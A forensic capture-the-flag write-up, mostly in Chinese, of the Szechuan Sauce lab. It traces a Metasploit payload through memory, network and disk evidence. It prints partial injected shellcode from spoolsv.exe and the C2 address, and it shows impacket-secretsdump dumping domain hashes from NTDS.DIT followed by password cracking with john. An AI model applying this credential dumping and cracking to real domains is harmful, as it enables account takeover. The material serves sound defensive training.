0x10ee003b 0000 ADD [EAX], AL 0x10ee003d 0000 ADD [EAX], AL 0x10ee003f 00 DB 0x0 Process: spoolsv.exe Pid: 3724 Address: 0x4afbf20000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x4afbf20000 fc 48 89 ce 48 81 ec 00 20 00 00 48 83 e4 f0 e8 .H..H......H.... 0x4afbf20010 cc 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 ....AQAPRQVH1.eH 0x4afbf20020 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 .R`H.R.H.R.H.rPH 0x4afbf20030 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c ..JJM1.H1..\u0026lt;a|., 0xfbf20000 fc CLD 0xfbf20001 48 DEC EAX 0xfbf20002 89ce MOV ESI, ECX 0xfbf20004 48 DEC EAX 0xfbf20005 81ec00200000 SUB ESP, 0x2000 0xfbf2000b 48 DEC EAX 0xfbf2000c 83e4f0 AND ESP, -0x10 0xfbf2000f e8cc000000 CALL 0xfbf200e0 0xfbf20014 41 INC ECX 0xfbf20015 51 PUSH ECX 0xfbf20016 41 INC ECX 0xfbf20017 50 PUSH EAX 0xfbf20018 52 PUSH EDX 0xfbf20019 51 PUSH ECX 0xfbf2001a 56 PUSH ESI 0xfbf2001b 48 DEC EAX 0xfbf2001c 31d2 XOR EDX, EDX 0xfbf2001e 6548 DEC EAX 0xfbf20020 8b5260 MOV EDX, [EDX+0x60] 0xfbf20023 48 DEC EAX 0xfbf20024 8b5218 MOV EDX, [EDX+0x18] 0xfbf20027 48 DEC EAX 0xfbf20028 8b5220 MOV EDX, [EDX+0x20] 0xfbf2002b 48 DEC EAX 0xfbf2002c 8b7250 MOV ESI, [EDX+0x50] 0xfbf2002f 48 DEC EAX 0xfbf20030 0fb74a4a MOVZX ECX, WORD [EDX+0x4a] 0xfbf20034 4d DEC EBP 0xfbf20035 31c9 XOR ECX, ECX 0xfbf20037 48 DEC EAX 0xfbf20038 31c0 XOR EAX, EAX 0xfbf2003a ac LODSB 0xfbf2003b 3c61 CMP AL, 0x61 0xfbf2003d 7c02 JL 0xfbf20041 0xfbf2003f 2c DB 0x2c Process: spoolsv.exe Pid: 3724 Address: 0x4afc1f0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x4afc1f0000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x4afc1f0010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x4afc1f0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x4afc1f0030 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 ................ 0xfc1f0000 4d DEC EBP 0xfc1f0001 5a POP EDX 0xfc1f0002 90 NOP 0xfc1f0003 0003 ADD [EBX], AL 0xfc1f0005 0000 ADD [EAX], AL 0xfc1f0007 000400 ADD [EAX+EAX], AL 0xfc1f000a 0000 ADD [EAX], AL 0xfc1f000c ff DB 0xff 0xfc1f000d ff00 INC DWORD [EAX] 0xfc1f000f 00b800000000 ADD [EAX+0x0], BH 0xfc1f0015 0000 ADD [EAX], AL 0xfc1f0017 004000 ADD [EAX+0x0], AL 0xfc1f001a 0000 ADD [EAX], AL 0xfc1f001c 0000 ADD [EAX], AL 0xfc1f001e 0000 ADD [EAX], AL 0xfc1f0020 0000 ADD [EAX], AL 0xfc1f0022 0000 ADD [EAX], AL 0xfc1f0024 0000 ADD [EAX], AL 0xfc1f0026 0000 ADD [EAX], AL 0xfc1f0028 0000 ADD [EAX], AL 0xfc1f002a 0000 ADD [EAX], AL 0xfc1f002c 0000 ADD [EAX], AL 0xfc1f002e 0000 ADD [EAX], AL 0xfc1f0030 0000 ADD [EAX], AL 0xfc1f0032 0000 ADD [EAX], AL 0xfc1f0034 0000 ADD [EAX], AL 0xfc1f0036 0000 ADD [EAX], AL 0xfc1f0038 0000 ADD [EAX], AL 0xfc1f003a 0000 ADD [EAX], AL 0xfc1f003c 0001 ADD [ECX], AL 0xfc1f003e 0000 ADD [EAX], AL Process: spoolsv.exe Pid: 3724 Address: 0x4afc070000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x4afc070000 4d 5a 41 52 55 48 89 e5 48 83 ec 20 48 83 e4 f0 MZARUH..H...H... 0x4afc070010 e8 00 00 00 00 5b 48 81 c3 b7 57 00 00 ff d3 48 .....[H...W....H 0x4afc070020 81 c3 34 b6 02 00 48 89 3b 49 89 d8 6a 04 5a ff ..4...H.;I..j.Z. 0x4afc070030 d0 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00 ................ 0xfc070000 4d DEC EBP 0xfc070001 5a POP EDX 0xfc070002 41 INC ECX 0xfc070003 52 PUSH EDX 0xfc070004 55 PUSH EBP 0xfc070005 48 DEC EAX 0xfc070006 89e5 MOV EBP, ESP 0xfc070008 48 DEC EAX 0xfc070009 83ec20 SUB ESP, 0x20 0xfc07000c 48 DEC EAX 0xfc07000d 83e4f0 AND ESP, -0x10 0xfc070010 e800000000 CALL 0xfc070015 0xfc070015 5b POP EBX 0xfc070016 48 DEC EAX 0xfc070017 81c3b7570000 ADD EBX, 0x57b7 0xfc07001d ffd3 CALL EBX 0xfc07001f 48 DEC EAX 0xfc070020 81c334b60200 ADD EBX, 0x2b634 0xfc070026 48 DEC EAX 0xfc070027 893b MOV [EBX], EDI 0xfc070029 49 DEC ECX 0xfc07002a 89d8 MOV EAX, EBX 0xfc07002c 6a04 PUSH 0x4 0xfc07002e 5a POP EDX 0xfc07002f ffd0 CALL EAX 0xfc070031 0000 ADD [EAX], AL 0xfc070033 0000 ADD [EAX], AL 0xfc070035 0000 ADD [EAX], AL 0xfc070037 0000 ADD [EAX], AL 0xfc070039 0000 ADD [EAX], AL 0xfc07003b 00f0 ADD AL, DH 0xfc07003d 0000 ADD [EAX], AL 0xfc07003f 00 DB 0x0 Process: spoolsv.exe Pid: 3724 Address: 0x4afc260000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x4afc260000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x4afc260010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x4afc260020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x4afc260030 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 00 ................ 0xfc260000 4d DEC EBP 0xfc260001 5a POP EDX 0xfc260002 90 NOP 0xfc260003 0003 ADD [EBX], AL 0xfc260005 0000 ADD [EAX], AL 0xfc260007 000400 ADD [EAX+EAX], AL 0xfc26000a 0000 ADD [EAX], AL 0xfc26000c ff DB 0xff 0xfc26000d ff00 INC DWORD [EAX] 0xfc26000f 00b800000000 ADD [EAX+0x0], BH 0xfc260015 0000 ADD [EAX], AL 0xfc260017 004000 ADD [EAX+0x0], AL 0xfc26001a 0000 ADD [EAX], AL 0xfc26001c 0000 ADD [EAX], AL 0xfc26001e 0000 ADD [EAX], AL 0xfc260020 0000 ADD [EAX], AL 0xfc260022 0000 ADD [EAX], AL 0xfc260024 0000 ADD [EAX], AL 0xfc260026 0000 ADD [EAX], AL 0xfc260028 0000 ADD [EAX], AL 0xfc26002a 0000 ADD [EAX], AL 0xfc26002c 0000 ADD [EAX], AL 0xfc26002e 0000 ADD [EAX], AL 0xfc260030 0000 ADD [EAX], AL 0xfc260032 0000 ADD [EAX], AL 0xfc260034 0000 ADD [EAX], AL 0xfc260036 0000 ADD [EAX], AL 0xfc260038 0000 ADD [EAX], AL 0xfc26003a 0000 ADD [EAX], AL 0xfc26003c e000 LOOPNZ 0xfc26003e 0xfc26003e 0000 ADD [EAX], AL Process: explorer.exe Pid: 3472 Address: 0x5770000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x05770000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x05770010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x05770020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x05770030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x05770000 0000 ADD [EAX], AL 0x05770002 0000 ADD [EAX], AL 0x05770004 0000 ADD [EAX], AL 0x05770006 0000 ADD [EAX], AL 0x05770008 0000 ADD [EAX], AL 0x0577000a 0000 ADD [EAX], AL 0x0577000c 0000 ADD [EAX], AL 0x0577000e 0000 ADD [EAX], AL 0x05770010 0000 ADD [EAX], AL 0x05770012 0000 ADD [EAX], AL 0x05770014 0000 ADD [EAX], AL 0x05770016 0000 ADD [EAX], AL 0x05770018 0000 ADD [EAX], AL 0x0577001a 0000 ADD [EAX], AL 0x0577001c 0000 ADD [EAX], AL 0x0577001e 0000 ADD [EAX], AL 0x05770020 0000 ADD [EAX], AL 0x05770022 0000 ADD [EAX], AL 0x05770024 0000 ADD [EAX], AL 0x05770026 0000 ADD [EAX], AL 0x05770028 0000 ADD [EAX], AL 0x0577002a 0000 ADD [EAX], AL 0x0577002c 0000 ADD [EAX], AL 0x0577002e 0000 ADD [EAX], AL 0x05770030 0000 ADD [EAX], AL 0x05770032 0000 ADD [EAX], AL 0x05770034 0000 ADD [EAX], AL 0x05770036 0000 ADD [EAX], AL 0x05770038 0000 ADD [EAX], AL 0x0577003a 0000 ADD [EAX], AL 0x0577003c 0000 ADD [EAX], AL 0x0577003e 0000 ADD [EAX], AL Process: explorer.exe Pid: 3472 Address: 0xd840000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x0d840000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0d840010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0d840020 00 00 84 0d 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0d840030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0d840000 0000 ADD [EAX], AL 0x0d840002 0000 ADD [EAX], AL 0x0d840004 0000 ADD [EAX], AL 0x0d840006 0000 ADD [EAX], AL 0x0d840008 0000 ADD [EAX], AL 0x0d84000a 0000 ADD [EAX], AL 0x0d84000c 0000 ADD [EAX], AL 0x0d84000e 0000 ADD [EAX], AL 0x0d840010 0000 ADD [EAX], AL 0x0d840012 0000 ADD [EAX], AL 0x0d840014 0000 ADD [EAX], AL 0x0d840016 0000 ADD [EAX], AL 0x0d840018 0000 ADD [EAX], AL 0x0d84001a 0000 ADD [EAX], AL 0x0d84001c 0000 ADD [EAX], AL 0x0d84001e 0000 ADD [EAX], AL 0x0d840020 0000 ADD [EAX], AL 0x0d840022 840d00000000 TEST [0x0], CL 0x0d840028 0000 ADD [EAX], AL 0x0d84002a 0000 ADD [EAX], AL 0x0d84002c 0000 ADD [EAX], AL 0x0d84002e 0000 ADD [EAX], AL 0x0d840030 0000 ADD [EAX], AL 0x0d840032 0000 ADD [EAX], AL 0x0d840034 0000 ADD [EAX], AL 0x0d840036 0000 ADD [EAX], AL 0x0d840038 0000 ADD [EAX], AL 0x0d84003a 0000 ADD [EAX], AL 0x0d84003c 0000 ADD [EAX], AL 0x0d84003e 0000 ADD [EAX], AL Process: ServerManager. Pid: 400 Address: 0x5dc9ce0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x5dc9ce0000 00 00 00 00 00 00 00 00 0a e5 1b 68 63 23 00 01 ...........hc#.. 0x5dc9ce0010 ee ff ee ff 02 00 00 00 20 01 ce c9 5d 00 00 00 ............]... 0x5dc9ce0020 20 01 ce c9 5d 00 00 00 00 00 ce c9 5d 00 00 00 ....].......]... 0x5dc9ce0030 00 00 ce c9 5d 00 00 00 0f 00 00 00 00 00 00 00 ....]........... 0xc9ce0000 0000 ADD [EAX], AL 0xc9ce0002 0000 ADD [EAX], AL 0xc9ce0004 0000 ADD [EAX], AL 0xc9ce0006 0000 ADD [EAX], AL 0xc9ce0008 0ae5 OR AH, CH 0xc9ce000a 1b6863 SBB EBP, [EAX+0x63] 0xc9ce000d 2300 AND EAX, [EAX] 0xc9ce000f 01ee ADD ESI, EBP 0xc9ce0011 ff DB 0xff 0xc9ce0012 ee OUT DX, AL 0xc9ce0013 ff02 INC DWORD [EDX] 0xc9ce0015 0000 ADD [EAX], AL 0xc9ce0017 0020 ADD [EAX], AH 0xc9ce0019 01ce ADD ESI, ECX 0xc9ce001b c9 LEAVE 0xc9ce001c 5d POP EBP 0xc9ce001d 0000 ADD [EAX], AL 0xc9ce001f 0020 ADD [EAX], AH 0xc9ce0021 01ce ADD ESI, ECX 0xc9ce0023 c9 LEAVE 0xc9ce0024 5d POP EBP 0xc9ce0025 0000 ADD [EAX], AL 0xc9ce0027 0000 ADD [EAX], AL 0xc9ce0029 00ce ADD DH, CL 0xc9ce002b c9 LEAVE 0xc9ce002c 5d POP EBP 0xc9ce002d 0000 ADD [EAX], AL 0xc9ce002f 0000 ADD [EAX], AL 0xc9ce0031 00ce ADD DH, CL 0xc9ce0033 c9 LEAVE 0xc9ce0034 5d POP EBP 0xc9ce0035 0000 ADD [EAX], AL 0xc9ce0037 000f ADD [EDI], CL 0xc9ce0039 0000 ADD [EAX], AL 0xc9ce003b 0000 ADD [EAX], AL 0xc9ce003d 0000 ADD [EAX], AL 0xc9ce003f 00 DB 0x0 Process: ServerManager. Pid: 400 Address: 0x5dc9cb0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x5dc9cb0000 00 00 00 00 00 00 00 00 90 44 ce c9 5d 00 00 00 .........D..]... 0x5dc9cb0010 90 44 ce c9 5d 00 00 00 00 00 ce c9 5d 00 00 00 .D..].......]... 0x5dc9cb0020 e0 0d cb c9 5d 00 00 00 00 10 cb c9 5d 00 00 00 ....].......]... 0x5dc9cb0030 00 d0 cb c9 5d 00 00 00 02 00 00 00 00 00 00 00 ....]........... 0xc9cb0000 0000 ADD [EAX], AL 0xc9cb0002 0000 ADD [EAX], AL 0xc9cb0004 0000 ADD [EAX], AL 0xc9cb0006 0000 ADD [EAX], AL 0xc9cb0008 90 NOP 0xc9cb0009 44 INC ESP 0xc9cb000a ce INTO 0xc9cb000b c9 LEAVE 0xc9cb000c 5d POP EBP 0xc9cb000d 0000 ADD [EAX], AL 0xc9cb000f 009044cec95d ADD [EAX+0x5dc9ce44], DL 0xc9cb0015 0000 ADD [EAX], AL 0xc9cb0017 0000 ADD [EAX], AL 0xc9cb0019 00ce ADD DH, CL 0xc9cb001b c9 LEAVE 0xc9cb001c 5d POP EBP 0xc9cb001d 0000 ADD [EAX], AL 0xc9cb001f 00e0 ADD AL, AH 0xc9cb0021 0dcbc95d00 OR EAX, 0x5dc9cb 0xc9cb0026 0000 ADD [EAX], AL 0xc9cb0028 0010 ADD [EAX], DL 0xc9cb002a cb RETF 0xc9cb002b c9 LEAVE 0xc9cb002c 5d POP EBP 0xc9cb002d 0000 ADD [EAX], AL 0xc9cb002f 0000 ADD [EAX], AL 0xc9cb0031 d0cb ROR BL, 0x1 0xc9cb0033 c9 LEAVE 0xc9cb0034 5d POP EBP 0xc9cb0035 0000 ADD [EAX], AL 0xc9cb0037 0002 ADD [EDX], AL 0xc9cb0039 0000 ADD [EAX], AL 0xc9cb003b 0000 ADD [EAX], AL 0xc9cb003d 0000 ADD [EAX], AL 0xc9cb003f 00 DB 0x0 Process: ServerManager. Pid: 400 Address: 0x5dc9e70000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x5dc9e70000 b9 f4 ff f6 05 36 da 28 00 01 74 1c 48 8b 43 10 .....6.(..t.H.C. 0x5dc9e70010 48 8d 15 59 05 00 00 44 0f b6 48 60 44 8b 80 ec H..Y...D..H`D... 0x5dc9e70020 00 00 00 e8 44 bf e0 ff 48 8b 4b 28 41 be 05 00 ....D...H.K(A... 0x5dc9e70030 00 00 41 8b d6 e8 16 d0 f4 ff 48 8b 43 08 41 8d ..A.......H.C.A. 0xc9e70000 b9f4fff605 MOV ECX, 0x5f6fff4 0xc9e70005 36da28 FISUBR DWORD [SS:EAX] 0xc9e70008 0001 ADD [ECX], AL 0xc9e7000a 741c JZ 0xc9e70028 0xc9e7000c 48 DEC EAX 0xc9e7000d 8b4310 MOV EAX, [EBX+0x10] 0xc9e70010 48 DEC EAX 0xc9e70011 8d1559050000 LEA EDX, [0x559] 0xc9e70017 44 INC ESP 0xc9e70018 0fb64860 MOVZX ECX, BYTE [EAX+0x60] 0xc9e7001c 44 INC ESP 0xc9e7001d 8b80ec000000 MOV EAX, [EAX+0xec] 0xc9e70023 e844bfe0ff CALL 0xc9c7bf6c 0xc9e70028 48 DEC EAX 0xc9e70029 8b4b28 MOV ECX, [EBX+0x28] 0xc9e7002c 41 INC ECX 0xc9e7002d be05000000 MOV ESI, 0x5 0xc9e70032 41 INC ECX 0xc9e70033 8bd6 MOV EDX, ESI 0xc9e70035 e816d0f4ff CALL 0xc9dbd050 0xc9e7003a 48 DEC EAX 0xc9e7003b 8b4308 MOV EAX, [EBX+0x8] 0xc9e7003e 41 INC ECX 0xc9e7003f 8d DB 0x8d :::\n:::spoiler Flag Flag: spoolsv :::\n==Q8== # Identify the IP Address that delivered the payload.\nRecon # 直覺會想要volatility的netscan，但是結果實在是太多了，後來轉念一想直接看封包不就好了，所以我直接看原本傳送coreupdater.exe到server的IP\nExploit # :::spoiler Flag Flag: 194.61.24.102 :::\n==Q9== # What IP Address was the malware calling to?\nRecon # 直覺就是volatility netscan再grep\nExploit # $ ./volatility_2.6_win64_standalone.exe -f citadeldc01.mem --profile Win2012R2x64 netscan | grep coreupdater Volatility Foundation Volatility Framework 2.6 0x20fc7590 TCPv4 10.42.85.10:62613 203.78.103.109:443 ESTABLISHED 3644 coreupdater.ex 0x60182590 TCPv4 10.42.85.10:62613 203.78.103.109:443 ESTABLISHED 3644 coreupdater.ex :::spoiler Flag Flag: 203.78.103.109 :::\n==Q10== # Where did the malware reside on the disk?\nRecon # 這一題直覺會在FTK上找，不過仔細想想可以直接volatility filescan再grep還比較快\nExploit # $ ./volatility_2.6_win64_standalone.exe -f citadeldc01.mem --profile Win2012R2x64 filescan | grep coreupdater.exe Volatility Foundation Volatility Framework 2.6 0x00000000130ddf20 16 0 RWD--- \\Device\\HarddiskVolume2\\Windows\\System32\\coreupdater.exereupdater.exe.2424urv.partial 0x000000002082ff20 5 0 R--r-d \\Device\\HarddiskVolume2\\Windows\\System32\\coreupdater.exereupdater.exe 0x0000000052317f20 16 0 RWD--- \\Device\\HarddiskVolume2\\Windows\\System32\\coreupdater.exereupdater.exe.2424urv.partial 0x000000005faa4f20 5 0 R--r-d \\Device\\HarddiskVolume2\\Windows\\System32\\coreupdater.exereupdater.exe :::spoiler Flag Flag: C:\\Windows\\System32\\coreupdater.exe :::\nReference # CyberDefenders: Szechuan Sauce CTF Writeup\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":90,"href":"/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/","title":"CyberDefender - Szechuan Sauce (Part 2)","section":"Securities","content":" CyberDefender - Szechuan Sauce (Part 2) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/31 Part 1: https://hackmd.io/@SBK6401/rkp952e76\n:::spoiler TOC [TOC] :::\nScenario # An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.\nThe helper\u0026rsquo;s demand for payment revealed that he was actually a threat actor. The company\u0026rsquo;s digital forensics team was called in to investigate and identify the attacker, determine the extent of the attack, and assess potential data breaches. The team must analyze the employee\u0026rsquo;s computer and communication logs to prevent similar attacks in the future.\nTools # volatility2 FTK Timeline Explorer Wireshark Registry Explorer ==Q11== # What\u0026rsquo;s the name of the attack tool you think this malware belongs to? (one word)\nRecon # 和malware相關的資訊，直覺會先看virustotal上的資訊，也的確發現答案的蹤跡\n:::spoiler Flag Flag: Metasploit :::\n==Q12== # One of the involved malicious IP\u0026rsquo;s is based in Thailand. What was the IP?\nRecon # 這個在virustotal上也有完整的資訊，只能說那個network graph真的太屌了，不只清楚也很炫泡 :::spoiler Flag Flag: 203.78.103.109 :::\n==Q13== # Another malicious IP once resolved to klient-293.xyz . What is this IP?\nRecon # 我是直接在network packets裡面撈比較常見的IP，不過看1才知道也可以直接用virustotal搜URL\nExploit # 方法一: 我看最多次request的IP有點可疑 方法二: 所以根據上一題可知我們現在有兩個可疑的IP，一個是傳送payload的IP$\\to$194.61.24.102，而另外一個是駭客的C2 server(在泰國的那個)$\\to$203.78.103.109\n:::spoiler Flag Flag: 194.61.24.102 :::\n==Q14== # The attacker performed some lateral movements and accessed another system in the environment via RDP. What is the hostname of that system?\nBackground # LLMNR LLMNR 是定義於標題為 \u0026ldquo;Link-local Multicast Name Resolution (LLMNR)\u0026rdquo; (連結-本機多點傳送名稱解析 (LLMNR)) (draft-ietf-dnsext-mdns-47.txt) 之網際網路草稿中的通訊協定，同時允許 IPv6 和 IPv4 主機為鄰接電腦執行名稱解析，而不需設定 DNS 伺服器或 DNS 用戶端。\n也就是，這是在LAN才會出現的，例如:嘗試使用WakeOnLan的時候，故若你沒有提出此要求，而發現有此封包在攻擊你的電腦時，它肯定就是病毒啦!!\nLogon Type Recon # 這一題找很久，不管是從wireshark或是從timeline explorer，參考1才知道有比較正確的方式\nExploit # 首先，攻擊的方向變成橫向移動，這件事情從rdp的封包就看的出來(內網和內網) WP中有提到兩種解析方式，一種是看network packets，另外一種是看event log\n方法一 可以直接用LLMNR的protocol當作filter 方法二 看了MSDN的logon type可以發現，如果是用RDP登入的話，要看type 10(RemoteInteractive)和3(使用者或電腦從網路登入這部電腦。)，所以橫向移動應該是logon type 3的範疇 :::spoiler Flag Flag: DESKTOP-SDN1RPT :::\n==Q15== # Other than the administrator, which user has logged into the Desktop machine? (two words)\nRecon # 這一題直覺就是延續上一題的狀況，直接看timeline explorer有登入的target :::spoiler Flag Flag: rick sanchez :::\n==Q16== # What was the password for \u0026ldquo;jerrysmith\u0026rdquo; account?\nRecon # 原本的直覺是follow之前寫的0x13 - Brute Force SAM可以爆破密碼，但我似乎搞錯題目的意思，應該說要找jerrysmith的密碼，直覺要對domain controller下手，不過應該不是找SAM hive，因為這個只有存取單一主機的認證authentication，所以如果要找儲存其他AD的密碼資訊，算是一個新的觀念:\nWhat is NTDS.DIT?\nNTDS.DIT stands for New Technology Directory Services Directory Information Tree. It serves as the primary database file within Microsoft’s Active Directory Domain Services (AD DS). Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. It acts as the backbone of Active Directory, housing critical data such as user account details, passwords, group memberships, and other object attributes.\nExploit # Export NTDS.DIT \u0026amp; SYSTEM NTDS.DIT在Domain Server的C:\\Windows\\NTDS\\ntds.dit，而SYSTEM在C:\\Windows\\System32\\config\\SAM\n用Kali裡面的impacket-secretsdump轉成hash :::spoiler Result\n$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -outputfile hashes.txt Impacket v0.11.0 - Copyright 2023 Fortra [*] Target system bootKey: 0xdfa37c24984935de32e2063e02918c28 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 6e884ac48cd2aa3a8d5f50c64d4bc38a [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:10e63d3f2c9924bae49241cff847e405::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CITADEL-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:33c082748b7d35ec846a513b7be92d94::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:25c9610b742a5bca9aa3801c08b8ca4e::: C137.local\\jerrysmith:1104:aad3b435b51404eeaad3b435b51404ee:bc51f858ccacc9db408c0ba511d5d639::: C137.local\\summersmith:1105:aad3b435b51404eeaad3b435b51404ee:26b2cc706093c4fa46e0519ec5feaeaf::: C137.local\\ricksanchez:1106:aad3b435b51404eeaad3b435b51404ee:746447f27820a9d863eea94d176cc135::: C137.local\\mortysmith:1108:aad3b435b51404eeaad3b435b51404ee:dc8b282b8f4e1dd3c5f95fd491ff6d8d::: C137.local\\bethsmith:1109:aad3b435b51404eeaad3b435b51404ee:b9cc9177094af2e17b413a0cbf63fac2::: C137.local\\birdman:1118:aad3b435b51404eeaad3b435b51404ee:944055b77ebe7d6fd80f24b5fce634fb::: DESKTOP-SDN1RPT$:1602:aad3b435b51404eeaad3b435b51404ee:fa6ecdc900cbeeb623cfc92297e5b653::: [*] Kerberos keys from ntds.dit CITADEL-DC01$:aes256-cts-hmac-sha1-96:3635b6b22a960673e327ca4c378e162befa74ee56e46b3841b84cabecfc062e8 CITADEL-DC01$:aes128-cts-hmac-sha1-96:9324dad1f82699bf65cdbfd5a4572067 CITADEL-DC01$:des-cbc-md5:94abfd29f1929d19 krbtgt:aes256-cts-hmac-sha1-96:141aca9186cc33caa6ef3db5cf3a53b783bd29e7431a153c89f8b1d4562de7f1 krbtgt:aes128-cts-hmac-sha1-96:d695009f7f7b6eb48a6b1b749493f199 krbtgt:des-cbc-md5:b025018c62ec023b C137.local\\jerrysmith:aes256-cts-hmac-sha1-96:87eb9c5715de1eb078cc6691871672019356976f093348c03b0ca21a75fc0e9f C137.local\\jerrysmith:aes128-cts-hmac-sha1-96:ea468a0f250c15fea4e8f4c74d20c56e C137.local\\jerrysmith:des-cbc-md5:7c40d03464e5e9a8 C137.local\\summersmith:aes256-cts-hmac-sha1-96:38060a9e953e8dde6e991db5de72e566c8a652c195b0e88d9c81e26d05ee1ce5 C137.local\\summersmith:aes128-cts-hmac-sha1-96:8851e24f50c80026e2e1578a2a3d3802 C137.local\\summersmith:des-cbc-md5:3bd09e3b73bfb0f4 C137.local\\ricksanchez:aes256-cts-hmac-sha1-96:08bc14d8f69e1ceadd0079303cd1bc434ed61d6a4895f71073662ff24eb8e4dd C137.local\\ricksanchez:aes128-cts-hmac-sha1-96:0c428543d20db44c45cbf6948b4cf5d4 C137.local\\ricksanchez:des-cbc-md5:cdf891a75889f107 C137.local\\mortysmith:aes256-cts-hmac-sha1-96:ee5442baa6535d2580ac694ac6c0cbe3a65f137ba3ace39a18cba58a160ce73c C137.local\\mortysmith:aes128-cts-hmac-sha1-96:697ece25fd3cffbfa24d82ab9789596c C137.local\\mortysmith:des-cbc-md5:3280f79b131aea4c C137.local\\bethsmith:aes256-cts-hmac-sha1-96:1e98c29b4ba43d21d200bd1802ff5109c0549621931e2f3af0c0809099405b88 C137.local\\bethsmith:aes128-cts-hmac-sha1-96:ea3285637fe5bb216bcd5cd0cfbc6663 C137.local\\bethsmith:des-cbc-md5:151f891ff4cb6b4f C137.local\\birdman:aes256-cts-hmac-sha1-96:f20039a71fad3a9a0a374c09e55f1d1bed1600c2329fee84aada8a502d903023 C137.local\\birdman:aes128-cts-hmac-sha1-96:6507f6ac1b4ec9c23e65d1528ec92ec1 C137.local\\birdman:des-cbc-md5:2f4068527aeafb85 DESKTOP-SDN1RPT$:aes256-cts-hmac-sha1-96:424f9a36c72c7bec7a2f7082111ed818c375e8945e6cfc9bc599b6587fb1b3ea DESKTOP-SDN1RPT$:aes128-cts-hmac-sha1-96:14122a1520d70f1dc6fccbf8aee330b0 DESKTOP-SDN1RPT$:des-cbc-md5:6d20ad583729b03e [*] Cleaning up... $ cat hashes.txt.ntds Administrator:500:aad3b435b51404eeaad3b435b51404ee:10e63d3f2c9924bae49241cff847e405::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CITADEL-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:33c082748b7d35ec846a513b7be92d94::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:25c9610b742a5bca9aa3801c08b8ca4e::: C137.local\\jerrysmith:1104:aad3b435b51404eeaad3b435b51404ee:bc51f858ccacc9db408c0ba511d5d639::: C137.local\\summersmith:1105:aad3b435b51404eeaad3b435b51404ee:26b2cc706093c4fa46e0519ec5feaeaf::: C137.local\\ricksanchez:1106:aad3b435b51404eeaad3b435b51404ee:746447f27820a9d863eea94d176cc135::: C137.local\\mortysmith:1108:aad3b435b51404eeaad3b435b51404ee:dc8b282b8f4e1dd3c5f95fd491ff6d8d::: C137.local\\bethsmith:1109:aad3b435b51404eeaad3b435b51404ee:b9cc9177094af2e17b413a0cbf63fac2::: C137.local\\birdman:1118:aad3b435b51404eeaad3b435b51404ee:944055b77ebe7d6fd80f24b5fce634fb::: DESKTOP-SDN1RPT$:1602:aad3b435b51404eeaad3b435b51404ee:fa6ecdc900cbeeb623cfc92297e5b653::: :::\nBrute Force\nOnline Tool 1 Online Tool 2 john: $ john hashes.txt.ntds --format=NT 我是直接用第二個線上工具解出一半的密碼，如下:\n10e63d3f2c9924bae49241cff847e405:)\u0026amp;Denver89 31d6cfe0d16ae931b73c59d7e0c089c0: 33c082748b7d35ec846a513b7be92d94: (None) 25c9610b742a5bca9aa3801c08b8ca4e: (None) bc51f858ccacc9db408c0ba511d5d639: !BETHEYBOO12! 26b2cc706093c4fa46e0519ec5feaeaf: (None) 